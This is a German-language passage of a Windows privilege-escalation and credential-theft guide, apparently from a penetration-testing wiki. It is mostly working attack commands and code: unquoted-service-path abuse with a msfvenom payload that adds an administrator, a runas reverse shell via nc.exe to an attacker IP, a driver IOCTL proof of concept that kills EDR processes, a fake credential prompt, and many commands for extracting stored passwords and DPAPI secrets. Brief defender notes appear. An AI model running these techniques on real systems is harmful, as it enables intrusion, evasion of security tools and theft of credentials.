for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Sie können diese Schwachstelle erkennen und exploit** mit metasploit: `exploit/windows/local/trusted\_service\_path` Sie können manuell eine Service-Binary mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows erlaubt es Benutzern, Aktionen anzugeben, die ausgeführt werden sollen, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf ein binary zeigt. Wenn dieses binary ersetzbar ist, könnte privilege escalation möglich sein. Mehr Details finden sich in der [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Anwendungen

### Installierte Anwendungen

Prüfe die **permissions of the binaries** (maybe you can overwrite one and escalate privileges) und die **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibrechte

Prüfe, ob du eine Konfigurationsdatei ändern kannst, um eine bestimmte Datei zu lesen, oder ob du ein Binärprogramm ändern kannst, das im Kontext eines Administrator-Kontos ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt jede Plugin-DLL aus seinen `plugins`-Unterordnern automatisch. Wenn eine beschreibbare portable/copy-Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start zu automatischer Codeausführung innerhalb von `notepad++.exe` (einschließlich aus `DllMain` und plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Systemstart ausführen

**Prüfe, ob du eine Registry- oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations to escalate privileges** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **third party weird/vulnerable** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber ein beliebiges kernel read/write primitive offenlegt (häufig bei schlecht gestalteten IOCTL-Handlern), kann man durch das Stehlen eines SYSTEM token direkt aus dem Kernel-Speicher eskalieren. Siehe die Schritt‑für‑Schritt‑Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann das absichtliche Verlangsamen der Suche (z. B. durch Komponenten mit maximaler Länge oder tiefe Verzeichnisketten) das Zeitfenster von Mikrosekunden auf einige zehn Mikrosekunden ausdehnen:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry-Hive-Speicher-Korruptionsprimitive

Moderne Hive-Schwachstellen erlauben es, deterministische Layouts vorzubereiten, beschreibbare HKLM/HKU-Nachkommen zu missbrauchen und Metadatenkorruption ohne eigenen Treiber in kernel paged-pool overflows zu verwandeln. Die komplette Kette hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Missbrauch des fehlenden FILE_DEVICE_SECURE_OPEN bei Device-Objekten (LPE + EDR kill)

Einige signierte Drittanbieter-Treiber erstellen ihr Device-Objekt mit einer starken SDDL via IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Device über einen Pfad geöffnet wird, der eine zusätzliche Komponente enthält, wodurch jeder unprivilegierte Benutzer einen Handle erhalten kann, indem er einen Namespace-Pfad wie:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

benutzt.

Sobald ein Benutzer das Device öffnen kann, können privilegierte IOCTLs, die der Treiber bereitstellt, für LPE und tampering missbraucht werden. Beispielhafte Fähigkeiten, in freier Wildbahn beobachtet:
- Rückgabe von Vollzugriffs-Handles zu beliebigen Prozessen (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter raw disk read/write (offline tampering, boot-time persistence tricks).
- Beenden beliebiger Prozesse, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR kill aus dem Userland via Kernel möglich ist.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Gegenmaßnahmen für Entwickler
- Setze immer FILE_DEVICE_SECURE_OPEN, wenn du Geräteobjekte erstellst, die durch eine DACL eingeschränkt werden sollen.
- Überprüfe den Aufruferkontext für privilegierte Operationen. Füge PP/PPL-Prüfungen hinzu, bevor Prozessbeendigung oder die Rückgabe von Handles erlaubt wird.
- Beschränke IOCTLs (access masks, METHOD_*, Eingabevalidierung) und erwäge brokered models statt direkter Kernel-Privilegien.

Erkennungsansätze für Verteidiger
- Überwache User-Mode-Öffnungen verdächtiger Device-Namen (z. B. \\ .\\amsdk*) und spezifische IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setze Microsofts Blockliste für verwundbare Treiber (HVCI/WDAC/Smart App Control) durch und pflege eigene Allow-/Deny-Listen.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner im PATH** hast, könntest du möglicherweise eine von einem Prozess geladene DLL hijacken und **Privilegien erhöhen**.

Überprüfe die Berechtigungen aller Ordner im PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Für weitere Informationen darüber, wie man diese Prüfung ausnutzen kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Prüfe auf andere bekannte Computer, die im hosts file hartkodiert sind.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Auf **eingeschränkte Dienste** von außen prüfen
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Sieh dir diese Seite für Firewall-bezogene Befehle an**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, ausschalten, ausschalten...)**

Mehr [Befehle zur Netzwerkerkennung hier](../basic-cmd-for-pentesters.md#network)

### Windows-Subsystem für Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden

Wenn du root user wirst, kannst du an jedem Port lauschen (das erste Mal, wenn du `nc.exe` benutzt, um an einem Port zu lauschen, wird per GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, kannst du `--default-user root` verwenden.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Anmeldeinformationsverwaltung / Windows Vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Der Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen **Windows** die Benutzer **automatisch anmelden** kann. Auf den ersten Blick könnte es so aussehen, als könnten Benutzer dort ihre Facebook-, Twitter- oder Gmail-Zugangsdaten usw. speichern, damit sie sich automatisch über Browser anmelden. Das ist jedoch nicht der Fall.

Der Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource zuzugreifen** (Server oder Website) **den Credential Manager** & Windows Vault nutzen kann und die gespeicherten Anmeldeinformationen verwendet, anstatt dass Benutzer ständig Benutzernamen und Passwort eingeben müssen.

Solange Anwendungen nicht mit dem Credential Manager interagieren, ist es meines Erachtens nicht möglich, dass sie die Anmeldeinformationen für eine bestimmte Ressource nutzen. Wenn deine Anwendung den Vault verwenden möchte, muss sie daher irgendwie **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource anfordern** aus dem standardmäßigen Speicher-Vault.

Verwende `cmdkey`, um die auf dem Rechner gespeicherten Anmeldeinformationen aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft eine entfernte Binärdatei über ein SMB-Share auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwenden von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** stellt eine Methode zur symmetrischen Verschlüsselung von Daten bereit und wird vorwiegend im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, das einen wesentlichen Beitrag zur Entropie leistet.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Login-Geheimnissen des Benutzers abgeleitet wird**. Bei Systemverschlüsselung werden die Domain-Authentifizierungsgeheimnisse des Systems verwendet.

Verschlüsselte RSA-Benutzerschlüssel, die mit DPAPI geschützt sind, werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den Benutzer-[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Key, der die privaten Schlüssel des Benutzers schützt, in derselben Datei abgelegt ist, besteht typischerweise aus 64 Bytes zufälliger Daten.** (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, sodass ein Auflisten seines Inhalts mit dem Befehl `dir` in CMD verhindert wird, es jedoch über PowerShell aufgelistet werden kann).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können das **mimikatz module** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files protected by the master password** befinden sich üblicherweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
Du kannst viele **DPAPI** **masterkeys** aus dem **memory** mit dem `sekurlsa::dpapi` Modul extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** werden häufig für **scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte credentials bequem zu speichern. Die credentials sind durch **DPAPI** geschützt, was typischerweise bedeutet, dass sie nur vom selben Benutzer auf demselben Computer, auf dem sie erstellt wurden, decrypted werden können.

Um eine PS credentials aus der Datei, die sie enthält, zu **decrypt**, kannst du Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WLAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Zuletzt ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remotedesktop-Anmeldeinformationsverwaltung**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Du kannst viele **DPAPI masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi` module extrahieren

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Beachte, dass du Administratorrechte benötigst und mit einem High Integrity level ausgeführt werden musst, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\  
Wenn diese Datei existiert, ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installer werden **mit SYSTEM privileges ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Schlüssel in der Registry

SSH-Privatschlüssel können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher solltest du prüfen, ob dort etwas Interessantes vorhanden ist:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann jedoch mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Mehr Informationen zu dieser Technik hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Systemstart automatisch startet, führen Sie aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige ssh keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh auf einer Maschine anzumelden. Der Registry-Pfad HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln nicht die Verwendung von `dpapi.dll` festgestellt.
 
### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Sie können diese Dateien auch mit **metasploit** suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-Backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Anmeldeinformationen
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Cached GPP Passwort

Eine Funktion war früher verfügbar, die das Bereitstellen von benutzerdefinierten lokalen Administratoraccounts auf einer Gruppe von Maschinen über Group Policy Preferences (GPP) ermöglichte. Diese Methode hatte jedoch erhebliche Sicherheitsmängel. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domain-Benutzer eingesehen werden. Zweitens konnten die in diesen GPPs enthaltenen Passwörter, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Keys verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Privilegien zu erlangen.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein nicht leeres Feld "cpassword" enthalten. Beim Finden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über das GPP und den Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitslücke hilft.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Zum Entschlüsseln des cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Mit crackmapexec passwords abrufen:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web-Konfiguration
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit Anmeldeinformationen:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Zugangsdaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Credentials fragen

Du kannst immer **den Benutzer bitten, seine credentials oder sogar die credentials eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass **das direkte Bitten** des Clients um die **credentials** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die credentials enthalten**

Bekannte Dateien, die vor einiger Zeit **passwords** in **clear-text** oder **Base64** enthalten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
